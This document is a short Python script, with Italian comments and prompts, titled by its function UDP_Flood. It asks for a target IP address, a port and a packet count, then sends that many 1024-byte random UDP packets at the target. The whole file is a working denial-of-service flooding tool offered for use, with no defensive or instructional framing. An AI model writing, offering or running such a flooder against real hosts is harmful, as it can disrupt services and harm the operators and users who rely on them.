import socket
import random 


def genera_pacchetto(dimensione):
    #genera un pacchetto di dimensione specificata

    return random.randbytes(dimensione)

def UDP_Flood(IP_target, porta_target, numero_pacchetti):
    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for _ in range(numero_pacchetti):
            pacchetto_casuale = genera_pacchetto(1024)
            sock.sendto(pacchetto_casuale, (IP_target, porta_target))
            

IP_target = input("Inserisci un indirizzo IP target:")
porta_target = int(input("Inserisci una porta:"))
numero_pacchetti = int(input("Inserisci il numero di pacchetti:"))

UDP_Flood(IP_target, porta_target, numero_pacchetti)

